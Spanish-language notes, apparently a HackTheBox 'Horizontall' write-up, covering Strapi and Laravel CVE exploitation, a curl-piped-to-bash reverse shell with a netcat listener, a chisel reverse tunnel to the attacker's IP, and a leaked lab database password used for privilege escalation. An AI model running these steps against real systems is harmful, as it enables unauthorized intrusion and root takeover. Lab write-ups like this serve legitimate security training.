maquina horizontal ---------------- htb linux 

aprendizaje 

analisis de codigo fuente 
subdominios 
explotacion de CVE
strapi
laravel
analisis de archivos de configuracion

------------------------------------

cuando entramos nos redirige y tenemos que meter el nombre de la pagina en el "etc/hosts" 


en esta maquina nos encontramos con una pagina que no tiene ningun tipo de pista
ni de formularios uqe puedan llevarnos a ningun lado, el tema es que dentro del "codigo fuente" 
se encuenta una subdominio que podemos volver a meter en el etc/hosts para poder entrar que esta 
escrito en una de las direcciones que te da un archivo .js  

en este caso es "http://api-prod.horizontall.htb"

lo que vemos al entrar es que tenemos una pagina de login, hemos probado las credenciales que 
mas o menos sabemos por defecto pero nada, el tema es que hay varios exploits que podemos usar 
segun exploit-db aunque los hemos buscado por searchsploit (esta en la carpeta exploits)


hemos visto uno que podemos ejecutar comandos ya que nos hemos mandado una traza ip con el 
exploit que a su vez nos ha creado una cuenta de admin, con esa cuenta podemos ver la pagina
pero no nos lleva a ningun lado, ya que podemos subir archivos y de todo al ser un panel de 
administracion pero no nos hace nada, el tema es que atraves de consola podemos mandarnos un ping

nos hemos puesto en escucha con "tcpdump" y listo, tenemos ejecucion de comandos, no podemos mandarnos
reverse shell ya que que esta capado, pero si que podemos mandarnos un curl, 

hemos creado un archivo index con una reverse shell dentro y lo hemos pipeado en bash 

curl http://<ip>/ 

simultaneamente nos hemos puesto un servidor python donde tenemos el archivo y tambien un netcat en escucha 

y listo estamos dentro....

------------
ESCALADA
------------

hemos visto que tiene pkexec para poder escalar de privilegios de una manera mucho mas facil y rapida
pero no es por donde va la maquina, por lo tanto lo que hemos hecho es nuestra metodologia para ver que 
tenemos a la vista para poder explotar 

sudo -l (pide contra que no tenemos)
id
find /-perm -4000 2>/dev/null
getcap /-r 2>/dev/null
cat /etc/crontab
"hemos tambien mirado archivos de config que habia en la carpeta /opt/strapi que nos ha arrojado una 
contraseña de developer, que es otro usuario y hemos entrado a mysql, pero no nos daba nada interesante
solo era un rabbit hole"

{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}

y nada pero hemos tirado un 

netstat -nat 

y listo hemos visto que corre uno de los puertos 8000 que no hemos visto en el escaneao de puertos del nmap
eso quiere decir que hay otra pagina corriendo por detras. lo que hemos hecho es tirar de chisel para poder 
traernos ese puerto a nuestra maquina ya que no podemos verla si no es con un curl
-------------------
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN     
tcp        0    138 10.10.11.105:50670      10.10.14.29:4646        ESTABLISHED
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN    


-------------------
hemos descargado el chisel de esta pagina 

https://github.com/jpillora/chisel

lo hemos compilado de esta manera

go bluid -ldflags "-s -w" .

y listo tenemos chisel, y lo hemos mandado la maquina victima montado un servidor python y haciendo wget 
en la maquina victima... 

ahora hay que montar los dos servidores para tener cominicacion y poder ver que hay dentro 

EN NUESTA MAQUINA 

./chisel server --reverse  -p 4000

"explicacion" --reverse es para decirle que es para montarlo en tu propia maquina. -p por el puerto elegido 

MAQUINA VICTIMA

./chisel client 10.10.14.29:4000 R:8000:127.0.0.1:8000

"explicacion" 

lo que le indicas es que el puerto 8000 lo quieres en el puerto 8000 del otro lado del servidor que hemos montado
con el puerto 4000 ya que 4000 es el puerto que se comunica con nuestra maquina. 

----

una vez tenemos eso lo que hemos hecho es ver la pagina localhost:8000 den nuesto navegador y hemos visto 
que es un laravel 8.0

por lo tanto hemos ido a buscar un exploit en google y listo tenemos uno que hemos encontrado en github (link) 

https://github.com/nth347/CVE-2021-3129_exploit  

con ese exploit que te explica como usarlo solo tenemos que poner este comando

$ ./exploit.py http://localhost:8000 Monolog/RCE1 id

y a correr nos ha tirado un id...

solo tenemos que hacer lo que hemos hecho anteriormente 

curl, server de python, y escucha por netcat y listo somos root.
